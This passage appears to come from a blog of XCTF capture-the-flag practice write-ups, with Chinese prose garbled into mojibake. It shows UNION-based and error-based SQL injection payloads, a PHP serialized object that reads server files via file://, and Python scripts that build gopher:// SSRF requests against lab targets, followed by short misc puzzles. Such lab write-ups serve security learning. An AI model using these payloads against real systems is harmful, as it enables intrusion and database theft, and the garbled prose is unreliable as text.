<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">çˆ†ç ´å­—æ®µæˆ‘è‡ªå·±æ„é€ çš„ä¸è¡Œï¼ŒæŸ¥çœ‹åˆ«äººçš„
</span></span><span class="line"><span class="cl">?no=-1 union/**/select/**/1,group_concat(no,&#39;~&#39;,username,&#39;~&#39;,passwd,&#39;~&#39;,data),3,4/**/from/**/fakebook.users
</span></span><span class="line"><span class="cl">?no=2 union/**/select 1,group_concat(data),3,4 from users#
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250120115640081.png"
	width="1911"
	height="726"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250120115640081_hu18335053679319860540.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250120115640081_hu14364030519208119123.png 1024w"
	loading="lazy"
	
		alt="image-20250120115640081"
	
	
		class="gallery-image" 
		data-flex-grow="263"
		data-flex-basis="631px"
	
></p>
<p>å‡ºæ¥ä¸€ä¸²åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ï¼Œæ ¹æ®å³è¾¹æç¤ºæŸ¥çœ‹/var/www/html/view.php</p>
<p>æ¥ä¸‹æ¥å°±æ˜¯æ„é€ åºåˆ—åŒ–å¯¹è±¡æ¥è®¿é—®/var/www/html/view.php,æµè§ˆå™¨ç›´æ¥è®¿é—®è‚¯å®šæ²¡ä¸œè¥¿ï¼Œç”¨file://ä¼ªåè®®è¯»å–æ–‡ä»¶</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">UserInfo</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">   <span class="k">public</span> <span class="nv">$name</span><span class="o">=</span><span class="s2">&#34;1&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">   <span class="k">public</span> <span class="nv">$age</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">   <span class="k">public</span> <span class="nv">$blog</span><span class="o">=</span><span class="s2">&#34;file:///var/www/html/view.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">UserInfo</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">O</span><span class="p">:</span><span class="mi">8</span><span class="p">:</span><span class="s2">&#34;UserInfo&#34;</span><span class="p">:</span><span class="mi">3</span><span class="p">:{</span><span class="n">s</span><span class="p">:</span><span class="mi">4</span><span class="p">:</span><span class="s2">&#34;name&#34;</span><span class="p">;</span><span class="n">s</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="s2">&#34;1&#34;</span><span class="p">;</span><span class="n">s</span><span class="p">:</span><span class="mi">3</span><span class="p">:</span><span class="s2">&#34;age&#34;</span><span class="p">;</span><span class="n">i</span><span class="p">:</span><span class="mi">0</span><span class="p">;</span><span class="n">s</span><span class="p">:</span><span class="mi">4</span><span class="p">:</span><span class="s2">&#34;blog&#34;</span><span class="p">;</span><span class="n">s</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="s2">&#34;file:///var/www/html/view.php&#34;</span><span class="p">;}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ ¹æ®ä¹‹å‰çš„æ³¨å…¥å¯çŸ¥ï¼Œæœ‰å›æ˜¾çš„æ˜¯ç¬¬äºŒä½ï¼Œä¹Ÿå°±æ˜¯<code>username</code>å­—æ®µï¼Œ<code>data</code>å¯¹åº”åº”è¯¥å°±æ˜¯ç¬¬å››ä¸ªå­—æ®µä¸ºï¼Œå°†ååºåˆ—åŒ–å­—ç¬¦ä¸²å°è¯•ä»¥æ³¨å…¥çš„æ–¹å¼å†™å…¥</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">?</span><span class="n">no</span><span class="o">=-</span><span class="mi">1</span> <span class="n">union</span><span class="o">/**/</span><span class="n">select</span><span class="o">/**/</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="s1">&#39;O:8:&#34;UserInfo&#34;:3:{s:4:&#34;name&#34;;s:1:&#34;1&#34;;s:3:&#34;age&#34;;i:0;s:4:&#34;blog&#34;;s:29:&#34;file:///var/www/html/flag.php&#34;;}&#39;</span>
</span></span><span class="line"><span class="cl"><span class="err">æ³¨æ„åºåˆ—åŒ–å­—ç¬¦ä¸²è¦åŠ </span><span class="s1">&#39;&#39;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä¼ å…¥åæŸ¥çœ‹æºç ï¼Œæœ€ä¸‹é¢å°±æ˜¯æˆ‘ä»¬å†™å…¥çš„blogé“¾æ¥å°±æ˜¯flagçš„é“¾æ¥</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250120121046849.png"
	width="1790"
	height="211"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250120121046849_hu35661371846742026.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250120121046849_hu9541665223747479854.png 1024w"
	loading="lazy"
	
		alt="image-20250120121046849"
	
	
		class="gallery-image" 
		data-flex-grow="848"
		data-flex-basis="2036px"
	
></p>
<h2 id="very_easy_sql">very_easy_sql
</h2><p>åˆšå¼€å§‹çš„ç½‘é¡µæ€ä¹ˆéƒ½æ³¨å…¥ä¸è¿›å»</p>
<p>æŸ¥çœ‹æºç å‘ç°use.php</p>
<p>è¦æ±‚è¾“å…¥url</p>
<p>çœ‹åˆ°curlï¼Œæœ‰ç‚¹åƒSSRFæ¼æ´ï¼Œåˆ©ç”¨ssrfå¯ä»¥ç”¨gopheråè®®</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">urllib.parse</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">host</span> <span class="o">=</span> <span class="s2">&#34;127.0.0.1:80&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">content</span> <span class="o">=</span> <span class="s2">&#34;uname=admin&amp;passwd=admin&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">content_length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">test</span> <span class="o">=</span>\
</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;POST /index.php HTTP/1.1
</span></span></span><span class="line"><span class="cl"><span class="s2">Host: </span><span class="si">{}</span><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">User-Agent: curl/7.43.0
</span></span></span><span class="line"><span class="cl"><span class="s2">Accept: */*
</span></span></span><span class="line"><span class="cl"><span class="s2">Content-Type: application/x-www-form-urlencoded
</span></span></span><span class="line"><span class="cl"><span class="s2">Content-Length: </span><span class="si">{}</span><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2"></span><span class="si">{}</span><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">content_length</span><span class="p">,</span><span class="n">content</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">tmp</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">test</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">new</span> <span class="o">=</span> <span class="n">tmp</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;%0A&#34;</span><span class="p">,</span><span class="s2">&#34;%0D%0A&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">new</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;gopher://&#34;</span><span class="o">+</span><span class="n">host</span><span class="o">+</span><span class="s2">&#34;/_&#34;</span><span class="o">+</span><span class="n">result</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250120165819759.png"
	width="1496"
	height="734"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250120165819759_hu10525937081612585875.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250120165819759_hu9395480923389652572.png 1024w"
	loading="lazy"
	
		alt="image-20250120165819759"
	
	
		class="gallery-image" 
		data-flex-grow="203"
		data-flex-basis="489px"
	
></p>
<p>setcookieé‚£é‡Œæ˜¯adminçš„base64ç¼–ç ï¼Œæ¨æµ‹é‚£é‡Œæ˜¯æ³¨å…¥ç‚¹</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">å…ˆæµ‹è¯•é—­åˆ
</span></span><span class="line"><span class="cl">admin&#39; #
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">urllib.parse</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">host</span> <span class="o">=</span> <span class="s2">&#34;127.0.0.1:80&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">cookie</span><span class="o">=</span><span class="s2">&#34;this_is_your_cookie=YWRtaW4nICM=&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">test</span> <span class="o">=</span>\
</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;GET /index.php HTTP/1.1
</span></span></span><span class="line"><span class="cl"><span class="s2">Host: </span><span class="si">{}</span><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">Connection: close
</span></span></span><span class="line"><span class="cl"><span class="s2">Content-Type: application/x-www-form-urlencoded
</span></span></span><span class="line"><span class="cl"><span class="s2">Cookie:</span><span class="si">{}</span><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">cookie</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">tmp</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">test</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="n">new</span> <span class="o">=</span> <span class="n">tmp</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;%0A&#34;</span><span class="p">,</span><span class="s2">&#34;%0D%0A&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">new</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;gopher://&#34;</span><span class="o">+</span><span class="n">host</span><span class="o">+</span><span class="s2">&#34;/_&#34;</span><span class="o">+</span><span class="n">result</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250120170344018.png"
	width="1498"
	height="740"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250120170344018_hu7262542278779887458.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250120170344018_hu16128043016853478251.png 1024w"
	loading="lazy"
	
		alt="image-20250120170344018"
	
	
		class="gallery-image" 
		data-flex-grow="202"
		data-flex-basis="485px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">æµ‹è¯•åˆ«çš„é—­åˆæ–¹å¼
</span></span><span class="line"><span class="cl">è™½ç„¶&#34;ä¹Ÿæ²¡å›æ˜¾ä½†æ˜¯è¯•å›¾æ¥ç€ç”¨&#34;æŠ¥é”™æ³¨å…¥ä¹Ÿæ²¡å›æ˜¾ï¼Œæ¢æˆ&#39;)å°±å›æ˜¾äº†
</span></span><span class="line"><span class="cl">çˆ†ç ´æ•°æ®åº“å
</span></span><span class="line"><span class="cl">admin&#39;) and extractvalue(1,concat(0x7e,database(),0x7e))#
</span></span><span class="line"><span class="cl">è¿™è¾¹ç”¨--+æ³¨é‡Šä¸è¡Œ
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250120171606488.png"
	width="1508"
	height="779"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250120171606488_hu5088072464863389225.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250120171606488_hu16471695108733486579.png 1024w"
	loading="lazy"
	
		alt="image-20250120171606488"
	
	
		class="gallery-image" 
		data-flex-grow="193"
		data-flex-basis="464px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">ä¸ºäº†æ–¹ä¾¿è¿˜æ˜¯æ”¹è„šæœ¬</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">urllib.parse</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl"><span class="n">host</span> <span class="o">=</span> <span class="s2">&#34;127.0.0.1:80&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;admin&#39;) and extractvalue(1,concat(0x7e,database(),0x7e))#&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">base64_payload</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)),</span> <span class="s2">&#34;utf-8&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">cookie</span><span class="o">=</span><span class="s2">&#34;this_is_your_cookie=&#34;</span><span class="o">+</span><span class="n">base64_payload</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">test</span> <span class="o">=</span>\
</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;GET /index.php HTTP/1.1
</span></span></span><span class="line"><span class="cl"><span class="s2">Host: </span><span class="si">{}</span><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">Connection: close
</span></span></span><span class="line"><span class="cl"><span class="s2">Content-Type: application/x-www-form-urlencoded
</span></span></span><span class="line"><span class="cl"><span class="s2">Cookie:</span><span class="si">{}</span><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">cookie</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">tmp</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">test</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">new</span> <span class="o">=</span> <span class="n">tmp</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;%0A&#34;</span><span class="p">,</span><span class="s2">&#34;%0D%0A&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">new</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;gopher://&#34;</span><span class="o">+</span><span class="n">host</span><span class="o">+</span><span class="s2">&#34;/_&#34;</span><span class="o">+</span><span class="n">result</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">çˆ†ç ´è¡¨å
</span></span><span class="line"><span class="cl">admin&#39;) or extractvalue(1,concat(0x7e,(select group_concat(table_name)from
</span></span><span class="line"><span class="cl">information_schema.tables where table_schema=database()),0x7e))#
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250120172009927.png"
	width="1475"
	height="781"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250120172009927_hu10609609471865802438.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250120172009927_hu3473464351993340138.png 1024w"
	loading="lazy"
	
		alt="image-20250120172009927"
	
	
		class="gallery-image" 
		data-flex-grow="188"
		data-flex-basis="453px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">çˆ†ç ´å­—æ®µå
</span></span><span class="line"><span class="cl">admin&#39;) or extractvalue(1,concat(0x7e,(select group_concat(column_name)from
</span></span><span class="line"><span class="cl">information_schema.columns where table_name=&#39;flag&#39;),0x7e))#
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250120172141977.png"
	width="1503"
	height="805"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250120172141977_hu11722049674916012827.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250120172141977_hu9903657710243563652.png 1024w"
	loading="lazy"
	
		alt="image-20250120172141977"
	
	
		class="gallery-image" 
		data-flex-grow="186"
		data-flex-basis="448px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">çˆ†ç ´å­—æ®µ
</span></span><span class="line"><span class="cl">admin&#39;) or extractvalue(1,concat(0x7e,(select flag from flag limit
</span></span><span class="line"><span class="cl">0,1),0x7e))#
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250120172451809.png"
	width="1467"
	height="767"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250120172451809_hu14908353755528327431.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250120172451809_hu12505487710634917600.png 1024w"
	loading="lazy"
	
		alt="image-20250120172451809"
	
	
		class="gallery-image" 
		data-flex-grow="191"
		data-flex-basis="459px"
	
></p>
<p>è¿™è¾¹ç”¨limitè¯»å–è¿˜æ˜¯è¯»ä¸å…¨ï¼Œç”¨substråˆ†å‰²è¯»å–</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">admin&#39;) and extractvalue(1,concat(0x7e,substr((select flag from flag),30,32),0x7e))#
</span></span></code></pre></td></tr></table>
</div>
</div><p>substrå°±æ˜¯å¯ä»¥substr(string,start,end)ä»startå¼€å§‹è¯»å–åˆ°end</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250120173404606.png"
	width="1498"
	height="755"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250120173404606_hu7872013784237563096.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250120173404606_hu1848372601070709402.png 1024w"
	loading="lazy"
	
		alt="image-20250120173404606"
	
	
		class="gallery-image" 
		data-flex-grow="198"
		data-flex-basis="476px"
	
></p>
<p>æ‹¼æ¥flag</p>
<h2 id="can_has_stdiomisc">can_has_stdio?ï¼ˆmisc)
</h2><p>æ‰“å¼€æ–‡ä»¶æ˜¯brainfuckä»£ç </p>
<p>åœ¨çº¿ç½‘ç«™http://esoteric.sange.fi/brainfuck/impl/interp/i.html</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250120193046493.png"
	width="1709"
	height="564"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250120193046493_hu5018088037902931136.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250120193046493_hu4070163229326546591.png 1024w"
	loading="lazy"
	
		alt="image-20250120193046493"
	
	
		class="gallery-image" 
		data-flex-grow="303"
		data-flex-basis="727px"
	
></p>
<h2 id="glance-50misc">glance-50(misc)
</h2><p>gifæ‹†åˆ†æ‹¼æ¥</p>
<p>kaliå‘½ä»¤</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">convert glance.gif flag.png
</span></span><span class="line"><span class="cl">montage flag*.png -tile x1 -geometry +0+0 flag.png
</span></span><span class="line"><span class="cl">-tile æ˜¯æ‹¼æ¥æ—¶æ¯è¡Œå’Œæ¯åˆ—çš„å›¾ç‰‡æ•°ï¼Œè¿™é‡Œç”¨ x1ï¼Œå°±æ˜¯åªä¸€è¡Œ
</span></span><span class="line"><span class="cl">-geometry æ˜¯é¦–é€‰æ¯ä¸ªå›¾å’Œè¾¹æ¡†å°ºå¯¸ï¼Œæˆ‘ä»¬è¾¹æ¡†ä¸º 0ï¼Œå›¾ç…§åŸå§‹å°ºå¯¸å³å¯
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="miss_01misc">miss_01(misc)
</h2><p>ä¸¢010å¯èƒ½æ˜¯ä¼ªåŠ å¯†</p>
<p>å·¥å…·ä¿®å¤</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250121175357997.png"
	width="1473"
	height="89"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250121175357997_hu4159377665941801152.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250121175357997_hu1311981892199919718.png 1024w"
	loading="lazy"
	
		alt="image-20250121175357997"
	
	
		class="gallery-image" 
		data-flex-grow="1655"
		data-flex-basis="3972px"
	
></p>
<p>æ‰“å¼€wordæ–‡ä»¶</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250121175728283.png"
	width="563"
	height="701"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250121175728283_hu13041505132673437048.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250121175728283_hu1880409575722263144.png 1024w"
	loading="lazy"
	
		alt="image-20250121175728283"
	
	
		class="gallery-image" 
		data-flex-grow="80"
		data-flex-basis="192px"
	
></p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250121175750311.png"
	width="776"
	height="631"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250121175750311_hu3084155753423518674.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250121175750311_hu6666133113468873917.png 1024w"
	loading="lazy"
	
		alt="image-20250121175750311"
	
	
		class="gallery-image" 
		data-flex-grow="122"
		data-flex-basis="295px"
	
></p>
<p>ä¸Šé¢è¿™ä¸ªæ˜¯rabbitåŠ å¯†</p>
<p>rabbitåŠ å¯†åå­—ç¬¦ä¸²å¼€å¤´ä¸ºU2FsdGVkX1</p>
<p>è€Œä¸‹é¢è¿™ä¸ªéšè—çš„æ˜¯å¸Œå°”åŠ å¯†</p>
<p><a class="link" href="https://tool.chinaz.com/tools/hill"  target="_blank" rel="noopener"
    >https://tool.chinaz.com/tools/hill</a></p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250121182502775.png"
	width="1040"
	height="1052"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250121182502775_hu16333887920055571040.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250121182502775_hu12823534784222332810.png 1024w"
	loading="lazy"
	
		alt="image-20250121182502775"
	
	
		class="gallery-image" 
		data-flex-grow="98"
		data-flex-basis="237px"
	
></p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250121182552847.png"
	width="1040"
	height="1052"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250121182552847_hu2996393364648348570.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250121182552847_hu4239559374824955495.png 1024w"
	loading="lazy"
	
		alt="image-20250121182552847"
	
	
		class="gallery-image" 
		data-flex-grow="98"
		data-flex-basis="237px"
	
></p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250121183324891.png"
	width="935"
	height="506"
